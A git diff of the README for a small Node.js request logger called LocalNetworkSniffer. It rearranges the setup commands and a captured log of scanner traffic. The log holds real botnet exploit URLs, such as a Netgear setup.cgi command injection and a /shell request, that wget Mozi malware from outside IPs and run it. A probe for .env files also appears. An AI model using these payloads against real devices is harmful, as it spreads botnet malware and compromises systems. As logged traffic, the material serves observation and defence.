@@ -13,7 +13,42 @@ A tiny node js-based program to listen on 80 port and will log all requests and 
 If you want to sniff a special domain at your server, You can setup following script at another VPS and proxy your target domain to next **SERVER IP**.
 Just: `nano /etc/hosts`
 
+
+### My Commands
+
+```
+curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash -
+sudo yum install nodejs
+cd ~/
+git clone https://github.com/BaseMax/LocalNetworkSniffer
+cd LocalNetworkSniffer
+npm install express --save
+yum install nano
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000
+sudo sh -c "iptables-save > /etc/iptables.rules"
+npm i -g pm2
+pm2 start app.js
+yum install wget curl
+wget -O - http://127.0.0.1/
+ls
+firewall-cmd --zone=public --add-port=80/tcp --permanent
+firewall-cmd --reload
+npm install --save node-telegram-bot-api
+pm2 log
+pm2 list
+pm2 restart 0
+pm2 log
+pm2 list
+pm2 stop 0
+npm i json-stringify-safe
+pm2 restart 0
+pm2 log
+```
+
 ### Funny
+
+It's very funny, bots are sending many fake requests to find BUG/Virus in websites.
+And it's going and growing daily, While ip of server is not published anywhere and bots and sending and sending...
 
 ```
 http://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.3.180:53147/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
@@ -317,41 +352,6 @@ http://SERVER_IP:80/
 http://undefined/
 http://SERVER_IP:80/shell?cd+/tmp;rm+-rf+*;wget+http://163.142.123.137:34204/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 http://SERVER_IP/.env
-```
-
-It's very funny, bots are sending many fake requests to find BUG/Virus in websites.
-And it's going and growing daily, While ip of server is not published anywhere and bots and sending and sending...
-
-
-### My Commands
-
-```
-curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash -
-sudo yum install nodejs
-cd ~/
-git clone https://github.com/BaseMax/LocalNetworkSniffer
-cd LocalNetworkSniffer
-npm install express --save
-yum install nano
-iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000
-sudo sh -c "iptables-save > /etc/iptables.rules"
-npm i -g pm2
-pm2 start app.js
-yum install wget curl
-wget -O - http://127.0.0.1/
-ls
-firewall-cmd --zone=public --add-port=80/tcp --permanent
-firewall-cmd --reload
-npm install --save node-telegram-bot-api
-pm2 log
-pm2 list
-pm2 restart 0
-pm2 log
-pm2 list
-pm2 stop 0
-npm i json-stringify-safe
-pm2 restart 0
-pm2 log
 ```
 
 ### TODO
